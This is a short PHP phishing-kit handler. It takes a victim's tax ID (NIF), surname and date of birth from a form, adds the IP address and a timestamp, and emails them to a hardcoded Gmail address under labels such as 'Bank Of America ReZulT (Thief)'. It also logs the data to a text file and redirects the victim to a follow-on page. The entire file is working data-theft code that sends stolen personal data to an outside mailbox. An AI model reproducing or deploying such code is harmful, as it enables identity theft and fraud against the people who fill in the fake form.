<?

$dat3=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "NIF : ".$_POST['NIF']."\n";
$message .= "NOM : ".$_POST['APELLIDO']."\n";
$message .= "DOB : ".$_POST['APELLIDO1']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$dat3."\n";


$recipient = "aqzwfx123@gmail.com";
$subject = "toma renta";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$cc", "Bank Of America ReZulT (Thief)", $message);
$ff=fopen("xxx.txt","a");
fwrite($ff,$message);
fclose($ff);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: index2.htm");

}	
?>













